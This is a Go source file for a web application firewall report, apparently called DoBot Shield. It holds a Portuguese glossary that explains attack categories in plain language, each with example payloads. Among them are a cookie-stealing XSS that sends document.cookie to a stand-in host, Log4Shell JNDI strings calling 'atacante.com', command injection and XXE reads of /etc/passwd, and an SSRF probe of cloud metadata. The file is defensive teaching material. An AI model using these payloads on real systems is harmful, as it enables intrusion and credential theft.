package report

// CategoryInfo traz a explicação didática de uma categoria de ameaça, escrita
// em linguagem acessível para que qualquer pessoa, mesmo sem formação em
// computação, entenda o que foi tentado e como o WAF se defendeu.
type CategoryInfo struct {
	Title    string    // nome amigável da ameaça
	Summary  string    // frase curta de apresentação (aparece no cabeçalho)
	Attack   string    // o que o ataque tenta fazer, em poucas palavras
	Defense  string    // como o DoBot Shield barra esse ataque
	Subtypes []Subtype // formas concretas em que o ataque costuma aparecer
}

// Subtype descreve uma variação concreta do ataque, com um exemplo de payload
// e a sua tradução para uma linguagem que qualquer pessoa entende.
type Subtype struct {
	Name        string // nome amigável do subtipo
	Explanation string // mini explicação não técnica do que ele faz
	Example     string // exemplo curto de payload
	Reading     string // tradução do exemplo para a linguagem do dia a dia
}

// categoryGlossary mapeia a categoria técnica (como aparece no log) para sua
// explicação simplificada. Cobre todas as categorias que o WAF pode registrar.
var categoryGlossary = map[string]CategoryInfo{
	"XSS": {
		Title:   "Cross-Site Scripting (XSS)",
		Summary: "O atacante esconde uma parte de um programa num campo do site para que ele rode no navegador de quem abrir a página.",
		Attack:  "Esse ataque mira os outros visitantes do site, e não o servidor. O atacante digita um pequeno parte de programa em algum campo, como a caixa de busca, um comentário ou o nome do perfil. Se o site mostrar esse texto na tela sem tratar, o navegador de quem abrir a página entende aquilo como código e executa. A partir daí, dá para roubar a senha, copiar o acesso já logado da pessoa ou fazer ações no lugar dela.",
		Defense: "O DoBot Shield já conhece a forma desses pedaços de código e os reconhece mesmo quando vêm embaralhados ou disfarçados. Quando encontra um, recusa a requisição antes que ela chegue ao site.",
		Subtypes: []Subtype{
			{
				Name:        "Aviso na tela só para testar",
				Explanation: "É a forma mais simples. O atacante manda a página abrir uma pequena janela de aviso. Sozinho, isso não causa dano nenhum. Serve só para ele confirmar que o código dele realmente roda ali.",
				Example:     "<script>alert(1)</script>",
				Reading:     "Funciona como deixar um bilhete dizendo 'consegui entrar aqui'. Não rouba nada, mas mostra que a porta estava destrancada.",
			},
			{
				Name:        "Roubo do acesso já logado (cookie)",
				Explanation: "Quando você entra em uma conta, o site guarda no seu navegador um arquivo que comprova que é você. Esse código copia esse arquivo e manda para o atacante, que passa a entrar na sua conta sem precisar da senha.",
				Example:     "<script>new Image().src='http://malicioso/?c='+document.cookie</script>",
				Reading:     "Ele tira uma cópia escondida do seu comprovante de login e envia para o computador dele.",
			},
			{
				Name:        "Escondido em uma imagem que falha",
				Explanation: "Em vez de usar a palavra script, que é fácil de filtrar, o atacante coloca uma imagem que sempre dá erro ao carregar. Esse erro foi preparado para disparar o código no lugar.",
				Example:     "<img src=x onerror=alert(1)>",
				Reading:     "A imagem foi feita para quebrar de propósito. No instante em que ela falha, o código escondido entra em ação.",
			},
		},
	},
	"SQLi": {
		Title:   "Injeção de SQL (SQLi)",
		Summary: "O atacante digita comandos de banco de dados nos campos do site para enganar o sistema e chegar a dados que não deveria ver.",
		Attack:  "Os sites guardam suas informações, como logins, senhas e produtos, num banco de dados, que obedece a uma linguagem chamada SQL. Em vez de preencher um campo com um dado comum, o atacante escreve ali um trecho dessa linguagem. Quando o site não trata isso direito, o banco de dados acaba obedecendo ao comando do atacante e pode entregar, alterar ou apagar informações.",
		Defense: "O DoBot Shield reconhece os comandos típicos dessa linguagem, e também os truques usados para escondê-los, e bloqueia a requisição antes que ela chegue ao banco.",
		Subtypes: []Subtype{
			{
				Name:        "Entrar sem saber a senha",
				Explanation: "No campo da senha, o atacante coloca uma condição que é sempre verdadeira. Como o sistema só confere se a condição bate, e ela sempre bate, o login é liberado.",
				Example:     "' OR '1'='1",
				Reading:     "Na hora de checar a senha, ele acrescenta 'ou então considere 1 igual a 1'. Como isso é sempre verdade, o sistema abre a porta.",
			},
			{
				Name:        "Puxar dados de outra tabela",
				Explanation: "O atacante emenda uma segunda consulta na primeira para trazer informações guardadas em outro lugar do banco, como a tabela de usuários e senhas.",
				Example:     "1 UNION SELECT usuario, senha FROM usuarios",
				Reading:     "Ele pede o produto de número 1 e, no mesmo pedido, encaixa e me traga junto a lista de usuários e senhas'.",
			},
			{
				Name:        "Escondendo o comando do filtro",
				Explanation: "Para driblar filtros que procuram o comando escrito por extenso, o atacante quebra as palavras com comentários no meio. Para o banco de dados, continua sendo exatamente o mesmo comando.",
				Example:     "UN/**/ION SEL/**/ECT",
				Reading:     "É a mesma ordem proibida, só que escrita com rabiscos entre as letras para o filtro não reconhecer a palavra.",
			},
		},
	},
	"CMD_INJ": {
		Title:   "Injeção de Comando (Command Injection)",
		Summary: "O atacante aproveita uma função do site que executa tarefas no servidor e gruda comandos próprios nela.",
		Attack:  "Algumas páginas executam tarefas no próprio servidor, como um teste de conexão. Quando isso não é bem protegido, o atacante consegue grudar comandos extras do sistema naquela tarefa. Com eles, tenta ler arquivos restritos ou até mesmo em casos severos assumir o controle da máquina.",
		Defense: "O DoBot Shield percebe os sinais usados para emendar um comando no outro, junto com as ferramentas que costumam ser chamadas nesses ataques, e recusa a requisição.",
		Subtypes: []Subtype{
			{
				Name:        "Emendar um comando a mais",
				Explanation: "Logo depois da tarefa esperada, o atacante usa um ponto e vírgula para começar um comando dele, por exemplo listar os arquivos de contas do sistema.",
				Example:     "127.0.0.1; cat /etc/passwd",
				Reading:     "Ele pede o teste de conexão e, em seguida, acrescenta 'e agora me mostre a lista de usuários do servidor'.",
			},
			{
				Name:        "Confirmar que a brecha funciona",
				Explanation: "Com o sinal &&, o atacante faz o segundo comando rodar só se o primeiro tiver dado certo. É um jeito de ter certeza de que o ataque está funcionando.",
				Example:     "127.0.0.1 && whoami",
				Reading:     "Faz o teste e, se ele passar, pede também 'me diga qual usuário o servidor está usando agora'.",
			},
		},
	},
	"JNDI": {
		Title:   "Injeção JNDI (Log4Shell)",
		Summary: "Um texto especial que faz o servidor buscar e rodar um programa indicado pelo atacante.",
		Attack:  "Aqui o atacante explora uma falha que ficou conhecida como Log4Shell. Basta enviar um texto montado de um jeito específico para o servidor sair buscando um programa num endereço escolhido pelo atacante e executá-lo. Em muitos casos, o problema acontece só de esse texto ser anotado em um registro interno do sistema.",
		Defense: "O DoBot Shield procura por esse texto de armadilha em qualquer parte da requisição, inclusive em cabeçalhos discretos, como o que informa qual navegador está sendo usado, e bloqueia.",
		Subtypes: []Subtype{
			{
				Name:        "A forma direta",
				Explanation: "O texto manda o servidor se conectar a um endereço do atacante e baixar de lá um programa para executar.",
				Example:     "${jndi:ldap://atacante.com/x}",
				Reading:     "É um endereço disfarçado que faz o servidor ligar para o atacante e seguir as instruções que ele mandar.",
			},
			{
				Name:        "A forma embaralhada",
				Explanation: "É a mesma armadilha, só que com as letras montadas em pedaços. Assim ela engana os filtros que procuram a palavra jndi escrita por inteiro.",
				Example:     "${${::-j}${::-n}di:ldap://atacante.com/x}",
				Reading:     "O mesmo golpe, escrito com as letras separadas para que ninguém perceba a palavra proibida.",
			},
		},
	},
	"NoSQLi": {
		Title:   "Injeção em banco NoSQL (NoSQLi)",
		Summary: "Em bancos de dados mais modernos, o atacante troca a senha por uma regra que combina com quase qualquer valor.",
		Attack:  "Existe um tipo de banco de dados, chamado NoSQL, que aceita receber regras de busca no lugar de valores fixos. O atacante aproveita isso e, em vez da senha, envia uma regra de propósito bem frouxa, que acaba sendo aceita para qualquer usuário.",
		Defense: "O DoBot Shield reconhece essas regras especiais dentro dos dados enviados e barra a tentativa.",
		Subtypes: []Subtype{
			{
				Name:        "Qualquer senha que não esteja vazia",
				Explanation: "No lugar da senha certa, o atacante manda a regra 'diferente de vazio'. Quase toda senha cadastrada atende a isso, então o login passa.",
				Example:     "{\"senha\": {\"$ne\": null}}",
				Reading:     "Ele não informa a senha. Ele diz 'aceite qualquer senha, contanto que exista uma', e o sistema deixa entrar.",
			},
			{
				Name:        "Qualquer valor serve",
				Explanation: "Outra regra frouxa: o atacante pede algo 'maior que vazio', condição que praticamente todo registro satisfaz.",
				Example:     "{\"usuario\": {\"$gt\": \"\"}}",
				Reading:     "É como pedir o primeiro usuário cujo nome seja maior que nada, ou seja, qualquer um da lista.",
			},
		},
	},
	"OPEN_REDIRECT": {
		Title:   "Redirecionamento Aberto (Open Redirect)",
		Summary: "Um link que começa no endereço do site verdadeiro, mas leva a vítima para uma página falsa.",
		Attack:  "Alguns sites têm links que, depois de uma ação, mandam a pessoa para outro endereço. O atacante manipula esse destino para apontar para uma página falsa. Como o começo do link é o site de confiança, a vítima não desconfia e acaba caindo num golpe.",
		Defense: "O DoBot Shield percebe quando esse destino aponta para um endereço de fora que parece suspeito e impede o desvio.",
		Subtypes: []Subtype{
			{
				Name:        "Destino trocado dentro do link",
				Explanation: "O endereço do site verdadeiro carrega, escondido, o endereço para onde a pessoa vai parar de verdade, em geral uma cópia falsa feita para roubar senhas.",
				Example:     "/login?next=https://site-falso.com",
				Reading:     "Você clica achando que vai para o login do site real, mas é levado para uma imitação dele.",
			},
			{
				Name:        "Disfarçado para enganar o filtro",
				Explanation: "O atacante omite o comecinho do endereço para escapar de filtros simples. Mesmo assim, o navegador entende que é um site de fora.",
				Example:     "/ir?url=//site-falso.com",
				Reading:     "Ele esconde uma parte do endereço para parecer interno, mas no fim o navegador leva a vítima para fora do site.",
			},
		},
	},
	"PATH_TRAVERSAL": {
		Title:   "Travessia de Diretórios (Path Traversal)",
		Summary: "O atacante usa atalhos de 'voltar uma pasta' para alcançar arquivos do servidor que deveriam ficar fora do seu alcance.",
		Attack:  "Quando um site deixa o usuário pedir um arquivo pelo nome, o atacante tenta usar atalhos que significam 'voltar uma pasta'. Repetindo esses atalhos, ele sai da área permitida e chega a arquivos sensíveis do servidor, como a lista de contas do sistema.",
		Defense: "O DoBot Shield identifica esses atalhos de 'voltar uma pasta' no endereço pedido e bloqueia o acesso ao arquivo.",
		Subtypes: []Subtype{
			{
				Name:        "Subindo pastas com ../",
				Explanation: "Cada ../ quer dizer 'volte uma pasta'. Repetindo várias vezes, o atacante chega até a base do sistema e pede um arquivo que deveria ser secreto.",
				Example:     "../../../etc/passwd",
				Reading:     "É como dizer 'saia desta sala, saia do corredor, saia do prédio' até chegar no depósito e pegar o arquivo de contas.",
			},
			{
				Name:        "O mesmo caminho, escrito em código",
				Explanation: "É a mesma subida de pastas, só que escrita em código, que é a forma como o navegador representa certos caracteres. Assim ela passa por filtros que só procuram ../.",
				Example:     "..%2f..%2f..%2fetc/passwd",
				Reading:     "O mesmo caminho proibido, escrito de um jeito cifrado para o filtro não reconhecer os atalhos.",
			},
		},
	},
	"SSRF": {
		Title:   "Falsificação de Requisição no Servidor (SSRF)",
		Summary: "O atacante faz o próprio servidor acessar endereços internos que só ele enxerga.",
		Attack:  "Em vez de atacar de fora, o atacante convence o servidor a fazer uma conexão no lugar dele. Normalmente o alvo é um endereço interno, que só o servidor consegue acessar, onde costumam ficar chaves de acesso e painéis de administração.",
		Defense: "O DoBot Shield reconhece quando o pedido aponta para endereços internos, privados ou de serviços de nuvem e recusa a requisição.",
		Subtypes: []Subtype{
			{
				Name:        "Chaves secretas da nuvem",
				Explanation: "Servidores hospedados em nuvem têm um endereço interno especial que guarda credenciais. O atacante faz o servidor consultar esse endereço e devolver as chaves.",
				Example:     "http://169.254.169.254/latest/meta-data/",
				Reading:     "Ele faz o servidor abrir a gaveta secreta da nuvem, onde ficam as chaves de acesso, e mostrar o conteúdo.",
			},
			{
				Name:        "Espiar a rede interna",
				Explanation: "O atacante aponta para máquinas ou painéis que só existem dentro da rede da empresa e que ele jamais alcançaria de fora.",
				Example:     "http://192.168.0.1/admin",
				Reading:     "É como pedir ao servidor: 'abra para mim essa página interna que só você consegue ver'.",
			},
		},
	},
	"SSTI": {
		Title:   "Injeção em Template no Servidor (SSTI)",
		Summary: "O atacante coloca uma fórmula no modelo da página para o servidor calcular.",
		Attack:  "Muitos sites montam suas páginas a partir de modelos, que são preenchidos com os dados de cada visita. O atacante coloca uma fórmula desse modelo dentro de um campo. Se o servidor calcular a fórmula em vez de só mostrar o texto, fica provado que ele obedece ao que recebe.",
		Defense: "O DoBot Shield identifica essas fórmulas de modelo dentro dos dados enviados e bloqueia.",
		Subtypes: []Subtype{
			{
				Name:        "A continha que entrega o jogo",
				Explanation: "O atacante envia uma conta simples. Se a página responde com o resultado, ele descobre que o servidor está calculando o que recebe, e não apenas exibindo.",
				Example:     "{{7*7}}",
				Reading:     "Se ao mandar '7 vezes 7' a página responde 49, o atacante já sabe que ela faz contas com aquilo que ele envia.",
			},
			{
				Name:        "Indo além da continha",
				Explanation: "Confirmada a brecha, o atacante tenta alcançar as ferramentas internas do servidor para executar ações de verdade, e não só fazer contas.",
				Example:     "{{ ''.__class__ }}",
				Reading:     "Depois do teste, ele tenta abrir a caixa de ferramentas interna do servidor para causar estrago de verdade.",
			},
		},
	},
	"RESPONSE_SQL_ERROR": {
		Title:   "Vazamento de Erro de Banco de Dados (na resposta)",
		Summary: "Ao dar erro, o site devolve uma mensagem técnica do banco que acaba entregando informações internas.",
		Attack:  "Aqui o problema está na resposta do site, e não no pedido. Quando algo dá errado, o sistema pode acabar mostrando a mensagem de erro crua do banco de dados. Essa mensagem revela detalhes internos, como nomes de tabelas, que ajudam o atacante a planejar o passo seguinte.",
		Defense: "O DoBot Shield examina o que o site responde e, ao encontrar uma mensagem de erro de banco vazando, troca a resposta para não entregar nenhuma pista.",
		Subtypes: []Subtype{
			{
				Name:        "Mensagem de erro do banco aparecendo na tela",
				Explanation: "No lugar de um aviso genérico, o site mostra o recado técnico do banco, com códigos e termos que confirmam a brecha e expõem como o sistema é organizado por dentro.",
				Example:     "SQLSTATE[42000]: Syntax error near 'DROP TABLE'",
				Reading:     "Em vez de um simples 'algo deu errado', o site exibe o relatório interno do banco, que vira um mapa nas mãos do atacante.",
			},
		},
	},
	"XXE": {
		Title:   "Entidade Externa de XML (XXE)",
		Summary: "Um arquivo XML preparado que faz o servidor abrir arquivos ou conexões que não deveria.",
		Attack:  "Quando o site aceita receber arquivos no formato XML, o atacante envia um XML montado com instruções escondidas. Essas instruções fazem o servidor abrir arquivos locais ou se conectar a outros endereços, vazando informações.",
		Defense: "O DoBot Shield detecta essas instruções perigosas dentro do XML enviado e bloqueia.",
		Subtypes: []Subtype{
			{
				Name:        "Ler um arquivo do servidor",
				Explanation: "O XML define um atalho que aponta para um arquivo do sistema. Ao processar o arquivo recebido, o servidor acaba incluindo o conteúdo desse arquivo na resposta.",
				Example:     "<!ENTITY x SYSTEM \"file:///etc/passwd\">",
				Reading:     "Dentro do arquivo enviado há uma ordem escondida: 'ao abrir isto, leia também o arquivo de senhas do servidor'.",
			},
		},
	},
	"PROTOTYPE_POLLUTION": {
		Title:   "Poluição de Protótipo (Prototype Pollution)",
		Summary: "O atacante mexe na configuração interna que todos os objetos do sistema compartilham.",
		Attack:  "Em sistemas feitos com JavaScript, existe uma espécie de configuração base que vale para todos os objetos do programa. O atacante usa chaves especiais para alterar essa base e, com isso, mudar o comportamento do sistema inteiro, por exemplo se tornando administrador.",
		Defense: "O DoBot Shield reconhece essas chaves especiais nos dados enviados e barra a requisição.",
		Subtypes: []Subtype{
			{
				Name:        "Plantar um privilégio escondido",
				Explanation: "O atacante injeta uma propriedade na configuração base, fazendo o sistema passar a tratá-lo como administrador sem que ninguém tenha dado essa permissão.",
				Example:     "{\"__proto__\": {\"admin\": true}}",
				Reading:     "Ele altera a configuração padrão para que, daquele momento em diante, todo mundo já comece com o carimbo de administrador.",
			},
		},
	},
	"HTTP_HEADER_INJECTION": {
		Title:   "Injeção em Cabeçalho HTTP",
		Summary: "O atacante usa quebras de linha para forjar cabeçalhos extras na comunicação.",
		Attack:  "Toda mensagem entre o navegador e o site carrega cabeçalhos, que são informações de controle. O atacante insere uma quebra de linha no meio de um valor para começar um cabeçalho novo, forjado por ele. Com isso, consegue, por exemplo, plantar um cookie ou bagunçar a resposta entregue a outras pessoas.",
		Defense: "O DoBot Shield detecta essas quebras de linha e os cabeçalhos forjados nos valores recebidos e recusa a requisição.",
		Subtypes: []Subtype{
			{
				Name:        "Plantar um cookie falso",
				Explanation: "Com uma quebra de linha, o atacante força o início de um novo cabeçalho, que instala no navegador da vítima um cookie escolhido por ele.",
				Example:     "valor\\r\\nSet-Cookie: sessao=invasor",
				Reading:     "No meio da mensagem, ele força uma linha nova dizendo 'e instale também este comprovante de acesso que eu escolhi'.",
			},
		},
	},
	"RESPONSE_STACK_TRACE": {
		Title:   "Vazamento de Rastro de Erro (Stack Trace)",
		Summary: "A resposta entrega o relatório interno de um erro, mostrando como o sistema é feito por dentro.",
		Attack:  "Quando um programa quebra, ele pode imprimir um rastro detalhado do erro, com nomes de arquivos, linhas e funções internas. Entregue ao usuário, isso dá ao atacante um mapa de como o sistema foi construído.",
		Defense: "O DoBot Shield reconhece esses rastros de erro na resposta e bloqueia a entrega, evitando expor o funcionamento interno do sistema.",
	},
	"RESPONSE_XSS_PATTERN": {
		Title:   "Padrão de Script Ativo na Resposta",
		Summary: "A resposta do site contém um padrão de script ativo; esta categoria não comprova que ele veio da requisição.",
		Attack:  "A resposta do site contém uma construção de script potencialmente executável no navegador. A detecção é baseada apenas no corpo da resposta e não demonstra, por si só, reflexão de uma entrada do usuário.",
		Defense: "O DoBot Shield examina a resposta, identifica o padrão ativo e impede que ele chegue ao navegador da pessoa.",
		Subtypes: []Subtype{
			{
				Name:        "Construção de script na resposta",
				Explanation: "A inspeção encontra uma marca ou chamada de script potencialmente ativa no corpo devolvido pelo backend, sem comparar esse trecho com a entrada recebida.",
				Example:     "<script>alert(1)</script>",
				Reading:     "O corpo contém um padrão de script; a origem desse padrão precisa ser confirmada por outra evidência.",
			},
		},
	},
	"RESPONSE_FILE_LEAK": {
		Title:   "Vazamento de Arquivo Sensível (na resposta)",
		Summary: "A resposta contém o conteúdo de arquivos que deveriam ser secretos.",
		Attack:  "A resposta do site contém o conteúdo de arquivos que deveriam ficar em segredo, como listas de contas do sistema ou arquivos de configuração.",
		Defense: "O DoBot Shield identifica esse conteúdo sensível na resposta e bloqueia a entrega.",
	},
	"MALFORMED_MULTIPART": {
		Title:   "Envio de Formulário Malformado",
		Summary: "Um envio de arquivo quebrado de propósito para confundir o servidor.",
		Attack:  "Em envios de formulários e arquivos, o atacante monta um pacote quebrado de propósito para confundir o servidor e escapar das verificações de segurança.",
		Defense: "O DoBot Shield recusa envios que não seguem corretamente as regras do formato, evitando que pacotes ambíguos sejam interpretados de um jeito perigoso.",
	},
	"MULTIPART_LIMIT": {
		Title:   "Excesso de Partes no Envio",
		Summary: "Um envio com partes demais, usado para sobrecarregar o servidor ou esconder conteúdo.",
		Attack:  "O atacante envia um formulário com um número exagerado de partes, seja para sobrecarregar o servidor, seja para esconder conteúdo malicioso no meio de muitos pedaços.",
		Defense: "O DoBot Shield limita a quantidade de partes que inspeciona e recusa envios que passam desse limite.",
	},
	"MULTIPART_PART_TOO_LARGE": {
		Title:   "Parte de Envio Grande Demais",
		Summary: "Uma parte gigante, usada para esgotar recursos ou driblar a inspeção.",
		Attack:  "Uma das partes do envio é grande demais, o que pode servir para esgotar os recursos do servidor ou para passar despercebida pela inspeção de conteúdo.",
		Defense: "O DoBot Shield recusa partes que passam do tamanho permitido para inspeção.",
	},
	"MULTIPART_READ_ERROR": {
		Title:   "Falha ao Ler o Envio",
		Summary: "Um envio que não pôde ser lido com segurança, muitas vezes sinal de manipulação.",
		Attack:  "O conteúdo enviado não pôde ser lido corretamente. Em geral, isso é sinal de um pacote manipulado para enganar o servidor.",
		Defense: "Diante de um envio que não dá para ler com segurança, o DoBot Shield prefere recusar a requisição.",
	},
}

// defaultCategoryInfo é usada quando a categoria não está no glossário.
var defaultCategoryInfo = CategoryInfo{
	Title:   "Atividade maliciosa detectada",
	Summary: "Um padrão típico de ataque a aplicações web.",
	Attack:  "Esta requisição apresentou um padrão típico de ataque a aplicações web.",
	Defense: "O DoBot Shield reconheceu o padrão suspeito e barrou a requisição antes que ela pudesse afetar o sistema protegido.",
}

// lookupCategory devolve a explicação da categoria, ou um texto genérico.
func lookupCategory(category string) CategoryInfo {
	if info, ok := categoryGlossary[category]; ok {
		return info
	}
	info := defaultCategoryInfo
	if category != "" && category != "-" {
		info.Title = category
	}
	return info
}
